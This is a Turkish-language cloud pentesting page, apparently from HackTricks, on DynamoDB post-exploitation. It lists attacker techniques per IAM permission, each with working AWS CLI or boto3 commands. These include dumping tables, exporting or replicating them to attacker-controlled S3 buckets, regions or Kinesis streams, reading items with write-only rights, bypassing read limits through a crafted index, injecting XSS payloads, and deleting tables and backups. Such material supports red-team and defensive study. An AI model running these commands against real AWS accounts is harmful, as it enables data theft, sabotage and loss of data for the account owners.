# AWS - DynamoDB Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## DynamoDB

Daha fazla bilgi için bakınız:

{{#ref}}
../aws-services/aws-dynamodb-enum.md
{{#endref}}

### `dynamodb:BatchGetItem`

Bu izne sahip bir saldırgan, **tabloların birincil anahtarına göre öğeleri alabilir** (tablodaki tüm verileri doğrudan isteyemezsiniz). Bu, birincil anahtarları bilmeniz gerektiği anlamına gelir (bunu tablo meta verilerini alarak elde edebilirsiniz (`describe-table`).

{{#tabs }}
{{#tab name="json file" }}
```bash
aws dynamodb batch-get-item --request-items file:///tmp/a.json

// With a.json
{
"ProductCatalog" : { // This is the table name
"Keys": [
{
"Id" : { // Primary keys name
"N": "205" // Value to search for, you could put here entries from 1 to 1000 to dump all those
}
}
]
}
}
```
{{#endtab }}

{{#tab name="inline" }}
```bash
aws dynamodb batch-get-item \
--request-items '{"TargetTable": {"Keys": [{"Id": {"S": "item1"}}, {"Id": {"S": "item2"}}]}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Potential Impact:** Tablodaki hassas bilgileri bularak dolaylı privesc

### `dynamodb:GetItem`

**Önceki izinlere benzer şekilde** bu izin, potansiyel bir saldırganın alınacak girdinin birincil anahtarı verildiğinde yalnızca 1 tablodan değerleri okumasına izin verir:
```json
aws dynamodb get-item --table-name ProductCatalog --key  file:///tmp/a.json

// With a.json
{
"Id" : {
"N": "205"
}
}
```
Bu izinle **`transact-get-items`** yöntemini şu şekilde kullanmak da mümkündür:
```json
aws dynamodb transact-get-items \
--transact-items file:///tmp/a.json

// With a.json
[
{
"Get": {
"Key": {
"Id": {"N": "205"}
},
"TableName": "ProductCatalog"
}
}
]
```
**Olası Etki:** Tablodaki hassas bilgileri bularak Indirect privesc

### `dynamodb:Query`

**Önceki izinlere benzer şekilde** bu izin potansiyel bir saldırganın, alınacak girdinin birincil anahtarı verildiğinde yalnızca 1 tablodan değerleri okumasına izin verir. [subset of comparisons](https://docs.aws.amazon.com/amazondynamodb/latest/APIReference/API_Condition.html) kullanmasına izin verir, ancak görünmesi gereken birincil anahtar ile izin verilen tek karşılaştırma "EQ" olduğu için tek bir istekte tüm veritabanını almak amacıyla karşılaştırma kullanamazsınız.

{{#tabs }}
{{#tab name="json file" }}
```bash
aws dynamodb query --table-name ProductCatalog --key-conditions file:///tmp/a.json

// With a.json
{
"Id" : {
"ComparisonOperator":"EQ",
"AttributeValueList": [ {"N": "205"} ]
}
}
```
{{#endtab }}

{{#tab name="inline" }}
```bash
aws dynamodb query \
--table-name TargetTable \
--key-condition-expression "AttributeName = :value" \
--expression-attribute-values '{":value":{"S":"TargetValue"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Potansiyel Etki:** Indirect privesc — tablodaki hassas bilgileri bularak

### `dynamodb:Scan`

Bu izni kullanarak tabloyu kolayca **dump** edebilirsiniz.
```bash
aws dynamodb scan --table-name <t_name> #Get data inside the table
```
**Potansiyel Etki:** Tabloda hassas bilgileri bularak dolaylı privesc

### `dynamodb:PartiQLSelect`

Bu izni, **tüm tabloyu kolayca dump etmek** için kullanabilirsiniz.
```bash
aws dynamodb execute-statement \
--statement "SELECT * FROM ProductCatalog"
```
Bu izin ayrıca `batch-execute-statement` gibi işlemleri gerçekleştirmeye de izin verir:
```bash
aws dynamodb batch-execute-statement \
--statements '[{"Statement": "SELECT * FROM ProductCatalog WHERE Id = 204"}]'
```
Ancak birincil anahtarı bir değerle belirtmeniz gerekir, bu yüzden çok kullanışlı değildir.

**Olası Etki:** Indirect privesc — tablodaki hassas bilgileri tespit ederek

### `dynamodb:ExportTableToPointInTime|(dynamodb:UpdateContinuousBackups)`

Bu izin, saldırganın **tüm tabloyu seçtiği bir S3 bucket'ına dışa aktarmasına** izin verir:
```bash
aws dynamodb export-table-to-point-in-time \
--table-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable \
--s3-bucket <attacker_s3_bucket> \
--s3-prefix <optional_prefix> \
--export-time <point_in_time> \
--region <region>
```
Bunun çalışması için tablonun point-in-time-recovery etkinleştirilmiş olması gerektiğini unutmayın; tablonun bunu sahip olup olmadığını şu şekilde kontrol edebilirsiniz:
```bash
aws dynamodb describe-continuous-backups \
--table-name <tablename>
```
Eğer etkin değilse, onu **etkinleştirmeniz** gerekir ve bunun için **`dynamodb:ExportTableToPointInTime`** iznine ihtiyacınız vardır:
```bash
aws dynamodb update-continuous-backups \
--table-name <value> \
--point-in-time-recovery-specification PointInTimeRecoveryEnabled=true
```
**Potential Impact:** Tabloda hassas bilgileri bularak dolaylı privesc

### `dynamodb:CreateTable`, `dynamodb:RestoreTableFromBackup`, (`dynamodb:CreateBackup`)

Bu izinlerle, bir saldırgan **yedekten yeni bir tablo oluşturabilir** (veya hatta bir yedek oluşturup bunu farklı bir tabloda geri yükleyebilir). Ardından, gerekli izinlerle, yedeklerden **bilgileri** kontrol ederek **üretim tablosunda artık bulunmayan** öğeleri görebilir.
```bash
aws dynamodb restore-table-from-backup \
--backup-arn <source-backup-arn> \
--target-table-name <new-table-name> \
--region <region>
```
**Olası Etki:** Dolaylı privesc — tablonun yedeğinde hassas bilgilerin bulunmasıyla

### `dynamodb:PutItem`

Bu izin, kullanıcılara **tabloya yeni bir öğe eklemelerine veya var olan bir öğeyi yeni bir öğe ile değiştirmelerine** olanak tanır. Aynı birincil anahtara sahip bir öğe zaten varsa, **tüm öğe yeni öğe ile değiştirilecektir**. Birincil anahtar mevcut değilse, belirtilen birincil anahtara sahip yeni bir öğe **oluşturulacaktır**.

{{#tabs }}
{{#tab name="XSS Example" }}
```bash
## Create new item with XSS payload
aws dynamodb put-item --table <table_name> --item file://add.json
### With add.json:
{
"Id": {
"S": "1000"
},
"Name": {
"S":  "Marc"
},
"Description": {
"S": "<script>alert(1)</script>"
}
}
```
{{#endtab }}

{{#tab name="AI Example" }}
```bash
aws dynamodb put-item \
--table-name ExampleTable \
--item '{"Id": {"S": "1"}, "Attribute1": {"S": "Value1"}, "Attribute2": {"S": "Value2"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Potansiyel Etki:** DynamoDB tablosuna veri ekleyip/değiştirme yeteneği ile ilave zaafiyetlerin/bypasses'ın kötüye kullanılması

### `dynamodb:UpdateItem`

Bu izin, kullanıcılara bir öğenin mevcut özniteliklerini **değiştirme veya öğeye yeni öznitelikler ekleme** imkanı verir. Bu işlem tüm öğeyi **değiştirmez**; yalnızca belirtilen öznitelikleri günceller. Birincil anahtar tabloda mevcut değilse, işlem belirtilen birincil anahtarla **yeni bir öğe oluşturur** ve update expression'ında belirtilen öznitelikleri ayarlar.

{{#tabs }}
{{#tab name="XSS Example" }}
```bash
## Update item with XSS payload
aws dynamodb update-item --table <table_name> \
--key file://key.json --update-expression "SET Description = :value" \
--expression-attribute-values file://val.json
### With key.json:
{
"Id": {
"S": "1000"
}
}
### and val.json
{
":value": {
"S": "<script>alert(1)</script>"
}
}
```
{{#endtab }}

{{#tab name="AI Example" }}
```bash
aws dynamodb update-item \
--table-name ExampleTable \
--key '{"Id": {"S": "1"}}' \
--update-expression "SET Attribute1 = :val1, Attribute2 = :val2" \
--expression-attribute-values '{":val1": {"S": "NewValue1"}, ":val2": {"S": "NewValue2"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Olası Etki:** DynamoDB tablosuna veri ekleyip/değiştirerek daha fazla güvenlik açığı/bypasses istismarı

### `dynamodb:DeleteTable`

Bu izne sahip bir saldırgan **bir DynamoDB tablosunu silebilir ve veri kaybına neden olabilir**.
```bash
aws dynamodb delete-table \
--table-name TargetTable \
--region <region>
```
**Olası etki**: Silinen tabloya bağlı hizmetlerde veri kaybı ve kesinti.

### `dynamodb:DeleteBackup`

Bu izne sahip bir saldırgan **DynamoDB yedeğini silebilir, felaket kurtarma senaryosunda potansiyel olarak veri kaybına yol açabilir**.
```bash
aws dynamodb delete-backup \
--backup-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable/backup/BACKUP_ID \
--region <region>
```
**Potansiyel etki**: Veri kaybı ve felaket kurtarma senaryosunda yedekten geri yükleyememe.

### `dynamodb:StreamSpecification`, `dynamodb:UpdateTable`, `dynamodb:DescribeStream`, `dynamodb:GetShardIterator`, `dynamodb:GetRecords`

> [!NOTE]
> TODO: Bunun gerçekten çalışıp çalışmadığını test edin

Bu izinlere sahip bir saldırgan **bir DynamoDB tablosunda bir akışı etkinleştirebilir, tabloda değişikliklerin akışını başlatmak için tabloyu güncelleyebilir ve ardından tablo değişikliklerini gerçek zamanlı olarak izlemek için akışa erişebilir**. Bu, saldırganın veri değişikliklerini izleyip exfiltrate etmesine olanak tanır; potansiyel olarak data leakage'e yol açabilir.

1. Bir DynamoDB tablosunda bir akış etkinleştirin:
```bash
aws dynamodb update-table \
--table-name TargetTable \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES \
--region <region>
```
2. ARN ve diğer detayları elde etmek için stream'i tanımlayın:
```bash
aws dynamodb describe-stream \
--table-name TargetTable \
--region <region>
```
3. Stream ARN kullanarak shard iterator'ı alın:
```bash
aws dynamodbstreams get-shard-iterator \
--stream-arn <stream_arn> \
--shard-id <shard_id> \
--shard-iterator-type LATEST \
--region <region>
```
4. shard iterator'ı kullanarak stream'den verilere erişin ve exfiltrate edin:
```bash
aws dynamodbstreams get-records \
--shard-iterator <shard_iterator> \
--region <region>
```
**Potential impact**: DynamoDB tablosunun değişikliklerinin gerçek zamanlı izlenmesi ve data leakage.

### `dynamodb:UpdateItem` ve `ReturnValues=ALL_OLD` ile öğeleri okuma

Bir tablo üzerinde yalnızca `dynamodb:UpdateItem` iznine sahip bir saldırgan, zararsız bir güncelleme yapıp `--return-values ALL_OLD` talep ederek normalde gereken okuma izinleri (`GetItem`/`Query`/`Scan`) olmadan öğeleri okuyabilir. DynamoDB, yanıtın `Attributes` alanında öğenin tam güncelleme öncesi görüntüsünü döner (bu, RCUs tüketmez).

- Minimum izinler: hedef tablo/anahtar üzerinde `dynamodb:UpdateItem`.
- Önkoşullar: öğenin birincil anahtarını bilmelisiniz.

Örnek (zararsız bir attribute ekler ve yanıt içindeki önceki öğeyi exfiltrate eder):
```bash
aws dynamodb update-item \
--table-name <TargetTable> \
--key '{"<PKName>":{"S":"<PKValue>"}}' \
--update-expression 'SET #m = :v' \
--expression-attribute-names '{"#m":"exfil_marker"}' \
--expression-attribute-values '{":v":{"S":"1"}}' \
--return-values ALL_OLD \
--region <region>
```
CLI yanıtı, önceki öğeyi (tüm öznitelikler) içeren bir `Attributes` bloğu döndürecektir; bu, yalnızca yazma iznine sahipken fiilen bir okuma ilkeline olanak sağlar.

**Olası Etki:** Yalnızca yazma izinleriyle bir tablodan rastgele öğeleri okuyabilme; birincil anahtarlar bilindiğinde hassas veri sızdırılmasına olanak tanır.


### `dynamodb:UpdateTable (replica-updates)` | `dynamodb:CreateTableReplica`

Yeni bir replica Region ekleyerek DynamoDB Global Table (version 2019.11.21) üzerinde gizli veri sızdırma. Eğer bir yetkili bölgesel bir replica ekleyebiliyorsa, tüm tablo saldırganın seçtiği Region'a çoğaltılır ve saldırgan buradan tüm öğeleri okuyabilir.

{{#tabs }}
{{#tab name="PoC (default DynamoDB-managed KMS)" }}
```bash
# Add a new replica Region (from primary Region)
aws dynamodb update-table \
--table-name <TableName> \
--replica-updates '[{"Create": {"RegionName": "<replica-region>"}}]' \
--region <primary-region>

# Wait until the replica table becomes ACTIVE in the replica Region
aws dynamodb describe-table --table-name <TableName> --region <replica-region> --query 'Table.TableStatus'

# Exfiltrate by reading from the replica Region
aws dynamodb scan --table-name <TableName> --region <replica-region>
```
{{#endtab }}
{{#tab name="PoC (customer-managed KMS)" }}
```bash
# Specify the CMK to use in the replica Region
aws dynamodb update-table \
--table-name <TableName> \
--replica-updates '[{"Create": {"RegionName": "<replica-region>", "KMSMasterKeyId": "arn:aws:kms:<replica-region>:<account-id>:key/<cmk-id>"}}]' \
--region <primary-region>
```
{{#endtab }}
{{#endtabs }}

İzinler: `dynamodb:UpdateTable` ( `replica-updates` ile) veya hedef tabloda `dynamodb:CreateTableReplica`. Replica'da CMK kullanılıyorsa, o anahtar için KMS izinleri gerekebilir.

Potansiyel Etki: Saldırganın kontrolündeki bir Bölge'ye tam tablo replikasyonu, gizli veri sızdırmaya yol açabilir.

### `dynamodb:TransactWriteItems` (read via failed condition + `ReturnValuesOnConditionCheckFailure=ALL_OLD`)

Transactional write ayrıcalıklarına sahip bir saldırgan, `TransactWriteItems` içinde kasıtlı olarak `ConditionExpression`'ı başarısız kılan ve `ReturnValuesOnConditionCheckFailure=ALL_OLD` olarak ayarlanan bir `Update` gerçekleştirerek mevcut bir öğenin tüm özniteliklerini sızdırabilir. Başarısızlık durumunda, DynamoDB işlem iptal sebeplerine önceki öznitelikleri ekler; bu da hedeflenen anahtarlar için yalnızca yazma erişimini okuma erişimine dönüştürür.

{{#tabs }}
{{#tab name="PoC (AWS CLI >= supports cancellation reasons)" }}
```bash
# Create the transaction input (list form for --transact-items)
cat > /tmp/tx_items.json << 'JSON'
[
{
"Update": {
"TableName": "<TableName>",
"Key": {"<PKName>": {"S": "<PKValue>"}},
"UpdateExpression": "SET #m = :v",
"ExpressionAttributeNames": {"#m": "marker"},
"ExpressionAttributeValues": {":v": {"S": "x"}},
"ConditionExpression": "attribute_not_exists(<PKName>)",
"ReturnValuesOnConditionCheckFailure": "ALL_OLD"
}
}
]
JSON

# Execute. Newer AWS CLI versions support returning cancellation reasons
aws dynamodb transact-write-items \
--transact-items file:///tmp/tx_items.json \
--region <region> \
--return-cancellation-reasons
# The command fails with TransactionCanceledException; parse cancellationReasons[0].Item
```
{{#endtab }}
{{#tab name="PoC (boto3)" }}
```python
import boto3
c=boto3.client('dynamodb',region_name='<region>')
try:
c.transact_write_items(TransactItems=[{ 'Update': {
'TableName':'<TableName>',
'Key':{'<PKName>':{'S':'<PKValue>'}},
'UpdateExpression':'SET #m = :v',
'ExpressionAttributeNames':{'#m':'marker'},
'ExpressionAttributeValues':{':v':{'S':'x'}},
'ConditionExpression':'attribute_not_exists(<PKName>)',
'ReturnValuesOnConditionCheckFailure':'ALL_OLD'}}])
except c.exceptions.TransactionCanceledException as e:
print(e.response['CancellationReasons'][0]['Item'])
```
{{#endtab }}
{{#endtabs }}

İzinler: `dynamodb:TransactWriteItems` hedef tabloda (ve ilgili öğede). Okuma izinleri gerekli değildir.

Potansiyel Etki: Sadece işlemsel yazma ayrıcalıkları kullanılarak ve döndürülen iptal nedenleri aracılığıyla bir tablodan (birincil anahtara göre) rastgele öğeler okunabilir.


### `dynamodb:UpdateTable` + `dynamodb:UpdateItem` + `dynamodb:Query` on GSI

Düşük entropili bir attribute üzerinde `ProjectionType=ALL` ile bir Global Secondary Index (GSI) oluşturarak okuma kısıtlamalarını aşın, bu attribute'u öğeler arasında sabit bir değere ayarlayın, ardından tam öğeleri almak için indeksi `Query` edin. Bu, temel tablo üzerinde `Query`/`Scan` reddedilmiş olsa bile, index ARN'sine sorgu yapabiliyorsanız çalışır.

- Gerekli minimum izinler:
- `dynamodb:UpdateTable` hedef tabloda (GSI'yi `ProjectionType=ALL` ile oluşturmak için).
- `dynamodb:UpdateItem` hedef tablo anahtarlarında (her öğe için indexlenen özniteliği ayarlamak üzere).
- `dynamodb:Query` index resource ARN üzerinde (`arn:aws:dynamodb:<region>:<account-id>:table/<TableName>/index/<IndexName>`).

Adımlar (PoC us-east-1'de):
```bash
# 1) Create table and seed items (without the future GSI attribute)
aws dynamodb create-table --table-name HTXIdx \
--attribute-definitions AttributeName=id,AttributeType=S \
--key-schema AttributeName=id,KeyType=HASH \
--billing-mode PAY_PER_REQUEST --region us-east-1
aws dynamodb wait table-exists --table-name HTXIdx --region us-east-1
for i in 1 2 3 4 5; do \
aws dynamodb put-item --table-name HTXIdx \
--item "{\"id\":{\"S\":\"$i\"},\"secret\":{\"S\":\"sec-$i\"}}" \
--region us-east-1; done

# 2) Add GSI on attribute X with ProjectionType=ALL
aws dynamodb update-table --table-name HTXIdx \
--attribute-definitions AttributeName=X,AttributeType=S \
--global-secondary-index-updates '[{"Create":{"IndexName":"ExfilIndex","KeySchema":[{"AttributeName":"X","KeyType":"HASH"}],"Projection":{"ProjectionType":"ALL"}}}]' \
--region us-east-1
# Wait for index to become ACTIVE
aws dynamodb describe-table --table-name HTXIdx --region us-east-1 \
--query 'Table.GlobalSecondaryIndexes[?IndexName==`ExfilIndex`].IndexStatus'

# 3) Set X="dump" for each item (only UpdateItem on known keys)
for i in 1 2 3 4 5; do \
aws dynamodb update-item --table-name HTXIdx \
--key "{\"id\":{\"S\":\"$i\"}}" \
--update-expression 'SET #x = :v' \
--expression-attribute-names '{"#x":"X"}' \
--expression-attribute-values '{":v":{"S":"dump"}}' \
--region us-east-1; done

# 4) Query the index by the constant value to retrieve full items
aws dynamodb query --table-name HTXIdx --index-name ExfilIndex \
--key-condition-expression '#x = :v' \
--expression-attribute-names '{"#x":"X"}' \
--expression-attribute-values '{":v":{"S":"dump"}}' \
--region us-east-1
```
**Potential Impact:** Tüm öznitelikleri projekte eden yeni oluşturulmuş bir GSI sorgulanarak, temel tablo okuma API'leri reddedilmiş olsa bile tam tablonun dışa aktarılması.


### `dynamodb:EnableKinesisStreamingDestination` (Kinesis Data Streams aracılığıyla sürekli dışa aktarım)

DynamoDB Kinesis streaming destinations'ı kötüye kullanarak bir tablodaki değişiklikleri saldırganın kontrolündeki bir Kinesis Data Stream'e sürekli olarak dışa aktarma. Etkinleştirildiğinde, her INSERT/MODIFY/REMOVE olayı tablo üzerinde okuma izinlerine ihtiyaç olmadan neredeyse gerçek zamanlı olarak stream'e iletilir.

Minimum izinler (saldırgan):
- `dynamodb:EnableKinesisStreamingDestination` on the target table
- Opsiyonel olarak `dynamodb:DescribeKinesisStreamingDestination`/`dynamodb:DescribeTable` durumu izlemek için
- Kayıtları tüketmek için saldırganın sahip olduğu Kinesis stream üzerinde okuma izinleri: `kinesis:ListShards`, `kinesis:GetShardIterator`, `kinesis:GetRecords`

<details>
<summary>PoC (us-east-1)</summary>
```bash
# 1) Prepare: create a table and seed one item
aws dynamodb create-table --table-name HTXKStream \
--attribute-definitions AttributeName=id,AttributeType=S \
--key-schema AttributeName=id,KeyType=HASH \
--billing-mode PAY_PER_REQUEST --region us-east-1
aws dynamodb wait table-exists --table-name HTXKStream --region us-east-1
aws dynamodb put-item --table-name HTXKStream \
--item file:///tmp/htx_item1.json --region us-east-1
# /tmp/htx_item1.json
# {"id":{"S":"a1"},"secret":{"S":"s-1"}}

# 2) Create attacker Kinesis Data Stream
aws kinesis create-stream --stream-name htx-ddb-exfil --shard-count 1 --region us-east-1
aws kinesis wait stream-exists --stream-name htx-ddb-exfil --region us-east-1

# 3) Enable the DynamoDB -> Kinesis streaming destination
STREAM_ARN=$(aws kinesis describe-stream-summary --stream-name htx-ddb-exfil \
--region us-east-1 --query StreamDescriptionSummary.StreamARN --output text)
aws dynamodb enable-kinesis-streaming-destination \
--table-name HTXKStream --stream-arn "$STREAM_ARN" --region us-east-1
# Optionally wait until ACTIVE
aws dynamodb describe-kinesis-streaming-destination --table-name HTXKStream \
--region us-east-1 --query KinesisDataStreamDestinations[0].DestinationStatus

# 4) Generate changes on the table
aws dynamodb put-item --table-name HTXKStream \
--item file:///tmp/htx_item2.json --region us-east-1
# /tmp/htx_item2.json
# {"id":{"S":"a2"},"secret":{"S":"s-2"}}
aws dynamodb update-item --table-name HTXKStream \
--key file:///tmp/htx_key_a1.json \
--update-expression "SET #i = :v" \
--expression-attribute-names {#i:info} \
--expression-attribute-values {:v:{S:updated}} \
--region us-east-1
# /tmp/htx_key_a1.json -> {"id":{"S":"a1"}}

# 5) Consume from Kinesis to observe DynamoDB images
SHARD=$(aws kinesis list-shards --stream-name htx-ddb-exfil --region us-east-1 \
--query Shards[0].ShardId --output text)
IT=$(aws kinesis get-shard-iterator --stream-name htx-ddb-exfil --shard-id "$SHARD" \
--shard-iterator-type TRIM_HORIZON --region us-east-1 --query ShardIterator --output text)
aws kinesis get-records --shard-iterator "$IT" --limit 10 --region us-east-1 > /tmp/krec.json
# Decode one record (Data is base64-encoded)
jq -r .Records[0].Data /tmp/krec.json | base64 --decode | jq .

# 6) Cleanup (recommended)
aws dynamodb disable-kinesis-streaming-destination \
--table-name HTXKStream --stream-arn "$STREAM_ARN" --region us-east-1 || true
aws kinesis delete-stream --stream-name htx-ddb-exfil --enforce-consumer-deletion --region us-east-1 || true
aws dynamodb delete-table --table-name HTXKStream --region us-east-1 || true
```
</details>

**Olası Etki:** Tablo değişikliklerinin, tablo üzerinde doğrudan okuma işlemi yapılmaksızın saldırgan kontrollü bir Kinesis stream'ine sürekli, neredeyse gerçek zamanlı exfiltration edilmesi.

{{#include ../../../banners/hacktricks-training.md}}
